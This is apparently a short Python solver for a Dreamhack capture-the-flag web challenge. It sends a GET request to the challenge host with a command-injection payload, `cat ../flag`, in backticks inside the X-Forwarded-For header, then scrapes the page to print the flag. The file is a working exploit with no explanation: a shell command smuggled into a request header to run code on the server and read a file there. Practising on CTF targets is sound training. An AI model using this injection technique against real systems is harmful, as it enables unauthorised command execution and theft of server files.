from bs4 import BeautifulSoup
import requests

# Local
#URL = "http://localhost:8000"

# Remote
URL = "http://host3.dreamhack.games:19806"
URI = "/"

# 1. RCE with Command Injection And Get Flag
PAYLOAD = {'X-Forwarded-For' : "`cat ../flag`"}

resp = requests.request(method='GET', url=URL + URI, headers=PAYLOAD)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('div', 'ip-address')
flag = pre.contents[0].replace('\n', '')

print(flag)